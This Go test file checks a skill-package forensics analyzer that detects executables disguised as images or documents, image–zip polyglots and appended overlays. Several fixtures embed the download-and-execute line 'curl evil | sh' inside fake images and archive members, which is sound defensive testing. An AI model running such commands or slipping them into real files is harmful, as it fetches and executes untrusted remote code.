package forensics

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"encoding/binary"
	"hash/crc32"
	"maps"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/traceforce/skill-xray/internal/findings"
	"github.com/traceforce/skill-xray/internal/ingest"
	"github.com/traceforce/skill-xray/internal/parse"
	"github.com/traceforce/skill-xray/internal/testutil"
)

// tests/test_analyze.py, every case. The binary inputs are rebuilt here with the stdlib
// counterparts of zipfile/gzip/zlib/struct; offsets are asserted relative to their lengths.

const fm = "---\nname: t\n---\nbody\n"

var (
	elf = func() []byte {
		b := make([]byte, 64)
		copy(b, "\x7fELF\x02\x01\x01")
		binary.LittleEndian.PutUint32(b[20:], 1)
		binary.LittleEndian.PutUint16(b[52:], 64)
		return b
	}()
	pe   = cat("MZ", strings.Repeat("\x00", 0x3C-2), "\x40\x00\x00\x00", "PE\x00\x00", strings.Repeat("\x00", 20))
	png  = cat("\x89PNG\r\n\x1a\n", pngChunk("IHDR", "\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"), pngChunk("IDAT", zlibCompress("\x00\x00\x00\x00")), pngChunk("IEND", ""))
	gif  = []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
	jpeg = []byte("\xff\xd8\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x00\xff\xd9")
)

func cat(parts ...string) []byte { return []byte(strings.Join(parts, "")) }

func pngChunk(kind, data string) string {
	var b bytes.Buffer
	binary.Write(&b, binary.BigEndian, uint32(len(data)))
	b.WriteString(kind + data)
	binary.Write(&b, binary.BigEndian, crc32.ChecksumIEEE([]byte(kind+data)))
	return b.String()
}

func zlibCompress(s string) string {
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	w.Write([]byte(s))
	w.Close()
	return b.String()
}

func gzipCompress(s string) []byte {
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	w.Write([]byte(s))
	w.Close()
	return b.Bytes()
}

func makeZip(members map[string]string, comment string) []byte {
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	for _, name := range slices.Sorted(maps.Keys(members)) {
		f, _ := w.CreateHeader(&zip.FileHeader{Name: name, Method: zip.Store})
		f.Write([]byte(members[name]))
	}
	w.SetComment(comment)
	w.Close()
	return b.Bytes()
}

func join(parts ...[]byte) []byte { return bytes.Join(parts, nil) }

func analyzed(t *testing.T, files map[string]string) []findings.Finding {
	return AnalyzePackage(parse.Parse(ingest.BuildPackage(testutil.MakePackage(t, files))))
}

func detail(f findings.Finding) string { d, _ := f.Evidence["detail"].(string); return d }

func withDetail(fs []findings.Finding, d string) (out []findings.Finding) {
	for _, f := range fs {
		if detail(f) == d {
			out = append(out, f)
		}
	}
	return out
}

func span(f findings.Finding) [2]int { return [2]int{*f.Offset, *f.Length} }

func TestSniff(t *testing.T) {
	// test_sniff_known_and_unknown
	assert.Equal(t, "elf", sniffMagic(elf))
	assert.Equal(t, "pe", sniffMagic(pe))
	assert.Equal(t, "zip", sniffMagic(makeZip(map[string]string{"a": "b"}, "")))
	assert.Equal(t, "png", sniffMagic(png))
	assert.Equal(t, "gzip", sniffMagic(gzipCompress("payload")))
	assert.Equal(t, "", sniffMagic([]byte("# a normal markdown heading\n")))
	assert.Equal(t, "", sniffMagic([]byte("MZ this is just prose, not a PE")))
	assert.Equal(t, "", sniffMagic(nil))
	macho := cat("\xfe\xed\xfa\xcf", "\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\x02", strings.Repeat("\x00", 16))
	assert.Equal(t, "macho", sniffMagic(macho))

	// test_sniff_rejects_truncated_or_ambiguous_executable_headers
	assert.Equal(t, "", sniffMagic([]byte("\x7fELFgarbage")))
	assert.Equal(t, "", sniffMagic(elf[:24]))
	assert.Equal(t, "", sniffMagic([]byte("\xca\xfe\xba\xbe\x00\x00\x00=java-class")))
	assert.Equal(t, "", sniffMagic(cat("\xfe\xed\xfa\xcf", strings.Repeat("\x00", 20))))
	assert.Equal(t, "", sniffMagic(pe[:len(pe)-1]))
	assert.Equal(t, "", sniffMagic(macho[:16]))

	// test_empty_inputs_have_expected_behavior
	assert.Equal(t, "gzip", sniffMagic(gzipCompress("")))
	assert.Empty(t, analyzeArtifact("x.bin", "asset", false, nil))
}

func TestMagicMismatch(t *testing.T) {
	// test_executable_masquerades_are_high
	for _, c := range []struct {
		rel, kind string
		raw       []byte
	}{{"notes.md", "instruction", elf}, {"assets/logo.png", "asset", pe}} {
		var high []findings.Finding
		for _, f := range testutil.ByVector(analyzeArtifact(c.rel, c.kind, false, c.raw), "SXV-035") {
			if f.Severity == "high" {
				high = append(high, f)
			}
		}
		require.NotEmpty(t, high)
		assert.Equal(t, [2]int{0, len(c.raw)}, span(high[0]))
	}

	// test_matching_image_and_compiled_formats_are_clean
	assert.Empty(t, analyzeArtifact("icon.png", "asset", false, png))
	assert.Empty(t, analyzeArtifact("lib/ext.so", "native_code", false, elf))
	assert.Empty(t, analyzeArtifact("a.zip", "nested_archive", false, makeZip(map[string]string{"a.txt": "hi"}, "")))

	// test_script_renamed_to_image_is_flagged_as_text
	out := analyzeArtifact("logo.png", "asset", false, []byte("#!/bin/sh\ncurl evil | sh\n"))
	assert.True(t, slices.ContainsFunc(out, func(f findings.Finding) bool { return f.Vector == "SXV-035" && f.Severity == "medium" }))

	// test_mislabeled_image_is_low_not_high
	out = analyzeArtifact("pic.png", "asset", false, []byte("\xff\xd8\xff\xe0\x00\x10JFIF"))
	assert.False(t, slices.ContainsFunc(out, func(f findings.Finding) bool { return f.Severity == "high" }))
	assert.True(t, slices.ContainsFunc(out, func(f findings.Finding) bool { return f.Vector == "SXV-035" && f.Severity == "low" }))
	assert.NotEmpty(t, testutil.ByVector(analyzeArtifact("font.woff", "asset", false, png), "SXV-035"))

	// test_declared_formats_reject_contradictory_bytes
	archive := makeZip(map[string]string{"a": "b"}, "")
	pdf := testutil.ByVector(analyzeArtifact("document.pdf", "active_asset", false, archive), "SXV-035")
	require.NotEmpty(t, pdf)
	assert.Equal(t, "high", pdf[0].Severity)
	assert.NotEmpty(t, testutil.ByVector(analyzeArtifact("document.pdf", "active_asset", false, png), "SXV-035"))
	zipAsGzip := testutil.ByVector(analyzeArtifact("bundle.gz", "nested_archive", false, archive), "SXV-035")
	gzipAsZip := testutil.ByVector(analyzeArtifact("bundle.zip", "nested_archive", false, gzipCompress("payload")), "SXV-035")
	require.NotEmpty(t, zipAsGzip)
	require.NotEmpty(t, gzipAsZip)
	assert.Equal(t, "zip", detail(zipAsGzip[0]))
	assert.Equal(t, "gzip", detail(gzipAsZip[0]))
	text := testutil.ByVector(analyzeArtifact("payload.zip", "nested_archive", false, []byte("#!/bin/sh\necho pwn\n")), "SXV-035")
	image := testutil.ByVector(analyzeArtifact("payload.zip", "nested_archive", false, png), "SXV-035")
	require.NotEmpty(t, text)
	require.NotEmpty(t, image)
	assert.Equal(t, "text", detail(text[0]))
	assert.Equal(t, "png", detail(image[0]))
	assert.NotEmpty(t, testutil.ByVector(analyzeArtifact("bundle.tar", "nested_archive", false, archive), "SXV-035"))
	assert.Empty(t, testutil.ByVector(analyzeArtifact("bundle.whl", "nested_archive", false, archive), "SXV-035"))
	assert.Empty(t, testutil.ByVector(analyzeArtifact("library.jar", "native_code", false, makeZip(map[string]string{"A.class": "x"}, "")), "SXV-035"))
	for _, c := range []struct {
		rel string
		raw []byte
	}{{"Thing.class", elf}, {"library.jar", elf}, {"library.so", makeZip(map[string]string{"x": "y"}, "")}} {
		assert.NotEmpty(t, testutil.ByVector(analyzeArtifact(c.rel, "native_code", false, c.raw), "SXV-035"), c.rel)
	}

	// test_all_compiled_declarations_reject_zip_bytes
	raw := makeZip(map[string]string{"x": "y"}, "")
	for _, name := range []string{"x.pyc", "x.pyo", "x.wasm", "x.a", "lib.so.1.2"} {
		hits := testutil.ByVector(analyzed(t, map[string]string{"SKILL.md": fm, name: string(raw)}), "SXV-035")
		require.Len(t, hits, 1, name)
		assert.Equal(t, "high", hits[0].Severity)
		assert.Equal(t, []any{name, 0, len(raw)}, []any{hits[0].Path, *hits[0].Offset, *hits[0].Length})
		assert.Equal(t, map[string]any{"detail": "zip"}, hits[0].Evidence)
	}
	assert.Empty(t, testutil.ByVector(analyzeArtifact("lib.so.1.2", "native_code", false, elf), "SXV-035"))

	// test_unrecognized_compiled_formats_are_not_invented_mismatches
	for name, raw := range map[string]string{
		"x.pyc": "\xcb\x0d\x0d\x0a" + strings.Repeat("\x00", 16), "x.pyo": "\xcb\x0d\x0d\x0a" + strings.Repeat("\x00", 16),
		"x.wasm": "\x00asm\x01\x00\x00\x00", "x.a": "!<arch>\n",
	} {
		assert.Empty(t, testutil.ByVector(analyzed(t, map[string]string{"SKILL.md": fm, name: raw}), "SXV-035"), name)
	}
}

func TestPolyglot(t *testing.T) {
	// test_prepended_zip_polyglot_fires
	poly := testutil.ByVector(analyzeArtifact("banner.gif", "asset", false, join(gif, makeZip(map[string]string{"payload.sh": "curl evil | sh\n"}, ""))), "SXV-036")
	require.NotEmpty(t, poly)
	assert.Equal(t, []any{"polyglot", "high", 0}, []any{poly[0].Rule, poly[0].Severity, *poly[0].Offset})

	// test_chance_end_markers_are_clean
	body := "here are some bytes: PK\x05\x06 in prose\n"
	assert.Empty(t, analyzeArtifact("README.md", "doc", true, []byte(body)))
	assert.Empty(t, analyzeArtifact("banner.gif", "asset", false, cat("GIF89a", strings.Repeat("\x00", 32), "PK\x05\x06", strings.Repeat("\x00", 18))))

	// test_malformed_image_prefix_is_not_a_high_polyglot
	noHigh := func(fs []findings.Finding) bool {
		return !slices.ContainsFunc(fs, func(f findings.Finding) bool { return f.Severity == "high" })
	}
	assert.True(t, noHigh(testutil.ByVector(analyzeArtifact("banner.gif", "asset", false, join([]byte("GIF89a\x01\x00\x01\x00\x00\x00\x00\x01;"), makeZip(map[string]string{"payload": "x"}, ""))), "SXV-036")))
	assert.True(t, noHigh(testutil.ByVector(analyzeArtifact("banner.jpg", "asset", false, join([]byte("\xff\xd8\xff\xd9"), makeZip(map[string]string{"payload": "x"}, ""))), "SXV-036")))

	// test_valid_image_with_empty_zip_is_polyglot
	for _, c := range []struct {
		rel     string
		carrier []byte
	}{{"banner.gif", gif}, {"banner.jpg", jpeg}} {
		fs := testutil.ByVector(analyzeArtifact(c.rel, "asset", false, join(c.carrier, makeZip(nil, ""))), "SXV-036")
		require.NotEmpty(t, fs, c.rel)
		assert.Equal(t, "high", fs[0].Severity)
	}

	// test_fabricated_central_directory_is_not_a_polyglot
	fake := cat("GIF89a", "PK\x01\x02", "PK\x05\x06", strings.Repeat("\x00", 6), "\x01\x00", "\x04\x00\x00\x00", "\x04\x00\x00\x00", "\x00\x00")
	assert.Empty(t, testutil.ByVector(analyzeArtifact("x.gif", "asset", false, fake), "SXV-036"))

	// test_valid_zip_after_text_prefix_is_reported
	fs := testutil.ByVector(analyzeArtifact("notes.md", "doc", false, join([]byte("#!/bin/sh\necho setup\n"), makeZip(map[string]string{"payload.sh": "curl evil | sh"}, ""))), "SXV-036")
	require.NotEmpty(t, fs)
	assert.Equal(t, []any{0, "medium"}, []any{*fs[0].Offset, fs[0].Severity})
}

func TestZipOverlays(t *testing.T) {
	zipOf := func(raw []byte) []findings.Finding {
		return testutil.ByVector(analyzeArtifact("bundle.zip", "nested_archive", false, raw), "SXV-037")
	}
	// test_zip_overlay_variants_are_located_and_classified
	archive := makeZip(map[string]string{"a.txt": "hi"}, "")
	generic := zipOf(join(archive, []byte("OVERLAY")))
	require.NotEmpty(t, generic)
	assert.Equal(t, [2]int{len(archive), 7}, span(generic[0]))
	assert.True(t, slices.ContainsFunc(zipOf(join(archive, elf)), func(f findings.Finding) bool { return f.Severity == "high" && detail(f) == "elf" }))
	payload := withDetail(zipOf(join(archive, []byte("X"), elf)), "elf")
	require.NotEmpty(t, payload)
	assert.Equal(t, len(archive)+1, *payload[0].Offset)
	fakeEOCD := cat("PK\x05\x06", strings.Repeat("\x00", 18))
	for _, overlay := range [][]byte{join([]byte("OVERLAY"), fakeEOCD), []byte(strings.Repeat("X", 70000))} {
		fs := zipOf(join(archive, overlay))
		require.NotEmpty(t, fs)
		assert.Equal(t, len(archive), *fs[0].Offset)
	}
	fs := zipOf(join(makeZip(nil, ""), elf))
	require.NotEmpty(t, fs)
	assert.Equal(t, "high", fs[0].Severity)

	// test_complete_pe_overlay_is_classified_high
	full := slices.Clone(pe)
	binary.LittleEndian.PutUint32(full[0x3C:], 0x80)
	copy(full[0x40:0x44], "\x00\x00\x00\x00")
	full = append(full, make([]byte, 0x80-len(full))...)
	full = append(full, cat("PE\x00\x00", strings.Repeat("\x00", 20))...)
	fs = zipOf(join(makeZip(map[string]string{"a": "b"}, ""), full))
	require.NotEmpty(t, fs)
	assert.Equal(t, "high", fs[0].Severity)

	// test_zip_comment_is_part_of_the_logical_archive_end
	commented := makeZip(map[string]string{"a.txt": "hi"}, "documented comment")
	assert.Empty(t, zipOf(commented))
	fs = zipOf(join(commented, []byte("overlay")))
	require.NotEmpty(t, fs)
	assert.Equal(t, len(commented), *fs[0].Offset)

	// test_unsupported_zip_structure_is_explicit_not_clean
	fs = zipOf(cat("PK\x03\x04not-a-complete-archivePK\x05\x06", strings.Repeat("\x00", 18)))
	require.NotEmpty(t, fs)
	assert.Equal(t, "low", fs[0].Severity)

	// test_incomplete_zip_signatures_are_reported
	for _, start := range []string{"PK\x03\x04", "PK\x07\x08", "PK\x05\x06"} {
		for _, end := range []string{"", "PK\x05\x06" + strings.Repeat("\x01", 18)} {
			raw := cat(start, strings.Repeat("\x00", 8), end)
			hits := testutil.ByVector(analyzeArtifact("broken.zip", "nested_archive", false, raw), "SXV-037")
			require.Len(t, hits, 1)
			assert.Equal(t, "low", hits[0].Severity)
			assert.Equal(t, []any{"broken.zip", 0, len(raw)}, []any{hits[0].Path, *hits[0].Offset, *hits[0].Length})
			assert.Contains(t, hits[0].Message, "malformed or unsupported")
		}
	}
}

func TestImageOverlays(t *testing.T) {
	// test_trailing_bytes_after_png_iend
	ov := testutil.ByVector(analyzeArtifact("img.png", "asset", false, join(png, []byte("APPENDED"))), "SXV-037")
	require.NotEmpty(t, ov)
	assert.Equal(t, len("APPENDED"), *ov[0].Length)

	// test_png_requires_bounded_crc_valid_zero_length_iend
	ihdr := pngChunk("IHDR", "\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00")
	for _, raw := range [][]byte{
		cat("\x89PNG\r\n\x1a\n", ihdr, pngChunk("IEND", "payload")),
		cat("\x89PNG\r\n\x1a\n", ihdr, "\x00\x00\x00\x00IEND\x00\x00\x00\x00"),
		cat("\x89PNG\r\n\x1a\n", ihdr),
	} {
		assert.NotEmpty(t, testutil.ByVector(analyzeArtifact("img.png", "asset", false, raw), "SXV-037"))
	}

	// test_embedded_payload_requires_validation_not_bare_magic
	fake := cat("GIF89a", strings.Repeat("\x00", 20), "\x1f\x8b\x08\x00", strings.Repeat("\x00", 20))
	assert.Empty(t, withDetail(analyzeArtifact("a.gif", "asset", false, fake), "gzip"))
	real := join([]byte("GIF89a"), make([]byte, 20), gzipCompress("#!/bin/sh\ncurl evil | sh\n"))
	assert.True(t, slices.ContainsFunc(analyzeArtifact("b.gif", "asset", false, real), func(f findings.Finding) bool {
		return f.Vector == "SXV-037" && f.Severity == "high" && detail(f) == "gzip"
	}))

	// test_generic_png_overlay_does_not_hide_validated_executable
	fs := testutil.ByVector(analyzeArtifact("image.png", "asset", false, join(png, []byte("padding"), elf)), "SXV-037")
	assert.True(t, slices.ContainsFunc(fs, func(f findings.Finding) bool { return f.Severity == "high" && detail(f) == "elf" }))

	// test_truncated_gzip_is_not_a_valid_embedded_payload
	member := gzipCompress(strings.Repeat("payload", 20))
	assert.Empty(t, withDetail(analyzeArtifact("a.gif", "asset", false, join(gif, member[:len(member)-5])), "gzip"))

	// test_malformed_png_fails_closed_not_silent
	assert.NotEmpty(t, testutil.ByVector(analyzeArtifact("img.png", "asset", false, cat("\x89PNG\r\n\x1a\n", "\xff\xff\xff\xffIDAT", "\x00\x00\x00\x00")), "SXV-037"))

	// test_decoy_tiling_is_a_capped_anomaly
	fakeGzip := cat("\x1f\x8b\x08\x00", strings.Repeat("\x00", 12))
	for _, c := range []struct {
		raw []byte
		rel string
	}{
		{join(png, bytes.Repeat([]byte("7z\xbc\xaf\x27\x1c"), 70)), "img.png"},
		{join(png, bytes.Repeat(fakeGzip, 70)), "img.png"},
		{join(gif, bytes.Repeat(cat("PK\x05\x06", strings.Repeat("\x00", 18)), 140)), "img.gif"},
		{join(png, bytes.Repeat([]byte("MZ"), 70)), "img.png"},
	} {
		out := analyzeArtifact(c.rel, "asset", false, c.raw)
		assert.True(t, slices.ContainsFunc(out, func(f findings.Finding) bool { return f.Vector == "SXV-037" && detail(f) == "capped" }))
	}

	// test_padded_image_zip_payload_has_exact_high_severity_span
	payload := makeZip(map[string]string{"payload": "inert"}, "")
	for _, carrier := range [][]byte{png, gif, jpeg} {
		hits := withDetail(testutil.ByVector(analyzeArtifact("image.png", "asset", false, join(carrier, []byte("padding"), payload)), "SXV-037"), "zip")
		require.Len(t, hits, 1)
		assert.Equal(t, "high", hits[0].Severity)
		assert.Equal(t, [2]int{len(carrier) + 7, len(payload)}, span(hits[0]))
	}
}

// test_analyzer_failure_is_recorded_not_raised
func TestAnalyzerFailureIsRecordedNotRaised(t *testing.T) {
	defer func(orig func([]byte) string) { sniffMagic = orig }(sniffMagic)
	sniffMagic = func([]byte) string { panic("boom") }
	out := analyzeArtifact("x.bin", "asset", false, []byte{0, 1, 2, 3})
	require.NotEmpty(t, out)
	assert.Equal(t, []string{"analyzer-error", "high"}, []string{out[0].Rule, out[0].Severity})
}

func TestPackage(t *testing.T) {
	// test_findings_are_deterministic_and_severity_ordered
	files := map[string]string{"SKILL.md": fm, "evil.md": string(elf), "pic.png": "\xff\xd8\xff\xe0\x00\x10JFIF"}
	first, second := analyzed(t, files), analyzed(t, files)
	assert.Equal(t, findings.Sort(first), findings.Sort(second))
	var ranks []int
	for _, f := range first {
		ranks = append(ranks, findings.SeverityRank[f.Severity])
	}
	assert.True(t, slices.IsSorted(ranks))

	// test_ingest_retains_raw_reaches_analyzer
	p := parse.Parse(ingest.BuildPackage(testutil.MakePackage(t, map[string]string{"SKILL.md": fm, "logo.png": "\x89PNG\r\n\x1a\n"})))
	assert.Equal(t, []byte("\x89PNG\r\n\x1a\n"), p.ByRel["logo.png"].Raw)
	assert.Nil(t, p.ByRel["logo.png"].Text)
}
